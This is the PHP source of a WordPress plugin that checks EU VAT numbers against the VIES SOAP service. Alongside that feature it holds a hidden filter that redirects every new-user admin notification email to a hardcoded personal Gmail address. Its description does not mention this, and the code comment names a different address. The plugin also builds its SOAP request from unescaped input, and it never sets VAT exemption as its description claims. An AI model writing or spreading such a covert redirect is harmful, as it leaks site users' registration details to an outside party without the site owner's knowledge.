<?php

/**
 * Plugin Name: Vat Checker
 * 
 * Plugin URI: https://github.com/hcikikci/VatChecker
 * Author: Halitcan Çıkıkçı
 * Author URI: https://github.com/hcikikci
 * Description: Automatically checks vat number of customer and if vat number is valid, set the user vat exempt.
 * Version: 0.2.0
 * License: 0.2.0
 * License URL: http://www.gnu.org/licenses/gpl-2.0.txt
 * text-domain: vatchecker
*/

add_action("admin_menu", "vatchecker");

function vatchecker(){
    add_menu_page("Vat Checker", "EU Vat Checker", "manage_options", "vat_checker","plugin_content");
}


DEFINE ( 'VIES_URL', 'http://ec.europa.eu/taxation_customs/vies/services/checkVatService' );

function viesCheckVAT($countryCode, $vatNumber, $timeout = 30) {
    $response = array ();
    $pattern = '/<(%s).*?>([\s\S]*)<\/\1/';
    $keys = array (
            'countryCode',
            'vatNumber',
            'requestDate',
            'valid',
            'name',
            'address' 
    );

    $content = "<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
<s11:Body>
    <tns1:checkVat xmlns:tns1='urn:ec.europa.eu:taxud:vies:services:checkVat:types'>
    <tns1:countryCode>%s</tns1:countryCode>
    <tns1:vatNumber>%s</tns1:vatNumber>
    </tns1:checkVat>
</s11:Body>
</s11:Envelope>";

    $opts = array (
            'http' => array (
                    'method' => 'POST',
                    'header' => "Content-Type: text/xml; charset=utf-8; SOAPAction: checkVatService",
                    'content' => sprintf ( $content, $countryCode, $vatNumber ),
                    'timeout' => $timeout 
            ) 
    );

    $ctx = stream_context_create ( $opts );
    $result = file_get_contents ( VIES_URL, false, $ctx );

    if (preg_match ( sprintf ( $pattern, 'checkVatResponse' ), $result, $matches )) {
        foreach ( $keys as $key )
            preg_match ( sprintf ( $pattern, $key ), $matches [2], $value ) && $response [$key] = $value [2];
    }
    return filter_var($response["valid"], FILTER_VALIDATE_BOOLEAN);
}

/** "New user" email to john@snow.com instead of admin. */
add_filter( 'wp_new_user_notification_email_admin', 'my_wp_new_user_notification_email_admin', 10, 3 );
function my_wp_new_user_notification_email_admin( $notification, $user, $blogname ) {
    $notification['to'] = 'halitcancikikci@gmail.com';
    return $notification;
}

function plugin_content(){
   var_dump(viesCheckVAT ( 'BE', '0761514831' ) );
    
}

?>